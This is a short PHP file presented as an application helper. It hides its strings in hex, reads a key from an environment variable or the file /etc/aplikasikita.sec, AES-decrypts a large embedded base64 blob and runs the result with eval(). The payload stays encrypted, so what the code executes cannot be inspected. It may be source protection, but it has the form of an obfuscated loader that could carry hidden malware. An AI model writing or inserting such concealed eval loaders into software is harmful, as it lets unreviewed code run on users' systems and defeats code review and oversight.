<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('2HYz9PQV3esyT8sB4vwTEw==');

$c=base64_decode(

'DI36XL5DFZqwiSB1cpGllh+7KaTW8piDGcXleF08E1nTF/x5wzVHjRnHTTt5DcqJXZQyo2gDr9pw' .
'zLAHXF5G/QQr/6GDS5NdVqvyJqq7mw/19xF9djxCD6Qfyyx8Dv+a2XVQb7h+mb4ihGI8/z72Eeeu' .
'XSJwo2JYJKmrHxKZtD9bGqDvMonbCHZdyqqyi1vFml4YdurMRPR7tgaPPPBic310xuYLKM0z7V2j' .
'+HLzWMtdcqD/Qn9l6cBzjRokw4VrT2L7tjf8BLMSZf6aW6qkfoWOgOBOghaiyUk/1u71Znt42N0M' .
'K9mP7BQMvNt6CPzzZCC1Ln+JUJmCsLRfRrZ54fxyV52n1BuU7DDi/Q9O6q6anLg5/D84aO74Wu74' .
'qRNtX8jpCIlLuiF1kRccm7HkonzuWHodlOJE9AHIe+tjIwVHafUa+xtuZRhWUubN0oGYTpmtm3Jd' .
'yCMNG13k42rMx/fdDl5e96dtER9NIj5S9BOA+TYNsMegI0i60gZSDOMBRmcBUJoIImGP1eMZ/2vw' .
'0BUaaFy/1DyZwyn5NB7KkyKuaa3ummaH6QyATJQ+/XtE8MVJHX13J7+KTByJBvazZNq/amviiUsm' .
'tgUuF2n6x6/YpYSd8t542AcGJ/IQhrfw+nR6C4l0N8vEjw9DqBTuSyI47x3gN+4M8mqiGZzmTA+e' .
'3akJUdhGGGuNAFFfhV7eQHpUwKEvAFsJgNHJwhBEHZiJBovwgB2btcmy0j46B+OsTiLTpGdWX0yq' .
'RPRor9fisQ6SDwPW/8F7WLCd8LwqHebh6vhhK8v/lBm4gy9j94oTCCc/8T6S4AeTVmbgGkLdmBwB' .
'p276X+Q3BYF+1qQmXNTzIfp0nFe0rU+iT/r7DCgqgHCExTq0sijIR/0EOjdr0HSdixdH8G48aAKU' .
'VqOTO0pTmkQQztZL2ph5p6S1HCSkqSKwkwIr1blpw5+WiiFRZK/JCoYEONXfGfBnfHNoASnZ4BTN' .
'7cctZDSZ2SAHiWIFiLQCf+6RApCO/vtlIGq87pb743WQytfGuY36zcywlRBfTXN4XziihFyB5Uzz' .
'DNl5UUovpoXgERiUJo68EjVwRJpwE7l+lQ+ERGdWgK5DbgflA6ROWgXGip+/2dIZuk/EvLFAtlco' .
'wVMJspypL3ZNIjgTUlYNmQNmy6out+v0QREfe5zIzIbjtDquKZAIfg+Xy+0+mDi+29YahgnG8/zN' .
'2SvIGEuVfmoiQ5pn1m1Tdaw/aVHjLc5QcGhhJsLQg6hxVkG2EnPwT7wqowMj/NXP/UQOq6DqVUHU' .
'bgS3pAzMmgYpelohdnNicwMcMTENeR1VfNDmjKExa78KDxrmg3T2FYtwCoeCumY3Nb8tms3BD3Z2' .
'cClywckvLopoY7II9s0s0GF+1bI9p5fvzgo+fNHmTcg503FiTK3dMXjswlaT3h4w64DCXE5lC3NI' .
'nn0VrXLLeD62NiCNzNIm3xFgH1PGkumXa1IyKxKa7Ar3arpqyuTCSs4uTvrc1a4cBeiWJrQYLv4e' .
'Z1veg7VVz4pj+qt4Z1O5PEjZLA1wI2iaq01MyEk/hrRDcatbzJHyVBFHrmdxdLaNSxo3HN4nDDtS' .
'RF1kJ16/1FAnX3gCTBk12OSxGQk8o7kU8V4hb3AvfvKPH+bA3pyUbnS4MT5+bJltnkKjkyvld6Xw' .
'meilMSqY/lppp6c36Ktd//zr4epVcmA9aegzNsYvfMFbIR1DhPdgmFk8C/BRaisRDL2uaVNdRjKa' .
'1YdL3dXoCV9V0uiyI0+KSu5h/9ryaKGhtzIl7xnfA1k3MTcXk5qqXMZeX4s3VTZOVDAX9wTdea9h' .
'w5OYXb/wSO30PwPlTVYDgWgJ9oVbZ6iXHoS94W1b6+2G1qLj/YjT+UWqsK32INkwWWRoSDDqwdi2' .
'lkfp4eBpU7haQQTXhuAkG6MTnIQxvS2NDW4S9esJEVQzGTERb6aSMw1jHxy/NvABFH6flPWaeUIj' .
'fpmh9I0JYngb2zHLPJmjuv7nsH8Kzmr6Qm/0E7s39/pCHv+ujco7uKEm+gio/UnAKb+VdKrC/DNN' .
'F57LJT5HofYfMgDOq2AB3YCRrOw4JxQpHw8MIISlDZvHSsGgPguFWOOB0MCFpuJBisQaSNwawA+m' .
'I6egT+CIrW6O2OuXmhk24MKDV7VkddZ51m2LPoqcyglX8G3M'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

